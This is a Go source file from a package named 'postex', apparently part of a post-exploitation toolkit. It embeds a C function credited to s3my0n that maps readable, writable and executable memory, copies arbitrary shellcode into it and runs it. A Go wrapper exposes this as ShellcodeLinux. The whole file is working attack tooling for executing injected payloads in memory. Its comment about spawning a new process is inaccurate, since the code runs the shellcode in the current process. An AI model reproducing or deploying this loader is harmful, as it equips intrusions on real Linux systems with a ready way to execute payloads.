// +build linux
// +build cgo

package postex
//Contains functions for loading and executing shellcode.
//Credit to s3my0n for the original C shellcode caller.

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

void s3my0n_caller(char *shellcode, size_t sclen) {
	void *ptr = mmap(0, sclen, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);
	if (ptr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}
	memcpy(ptr, shellcode, sclen);
	(*(void(*) ()) ptr)();
}
*/
import "C"
import "unsafe"

// Spawn a new process and load some shellcode into it.

func ShellcodeLinux(sc []byte) error {
	C.s3my0n_caller((*C.char)(unsafe.Pointer(&sc[0])), (C.size_t)(len(sc)))
	return nil
}
